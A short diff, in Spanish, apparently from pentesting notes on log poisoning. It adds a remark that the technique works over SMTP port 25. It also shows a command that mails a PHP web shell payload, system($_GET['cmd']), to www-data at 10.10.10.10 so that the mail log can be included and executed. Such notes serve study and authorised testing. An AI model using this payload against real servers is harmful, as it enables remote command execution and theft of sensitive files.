@@ -160,7 +160,9 @@ Si logramos incrustar código PHP en el log y que luego sea interpretado, podrem
 - Esto permite ejecutar comandos en el servidor y leer archivos sensibles
 
 <a name="mail"></a>
-📧En algunos casos podremos hacer lo mismo vía mail:
+📧En algunos casos podremos hacer lo mismo vía mail
+
+Si está abierto el puerto 25, que es el puerto estándar para el protocolo SMTP (envío de correo):
 
 ```bash
 mail -s "<?php system(\$_GET['cmd']); ?>" www-data@10.10.10.10 < /dev/null
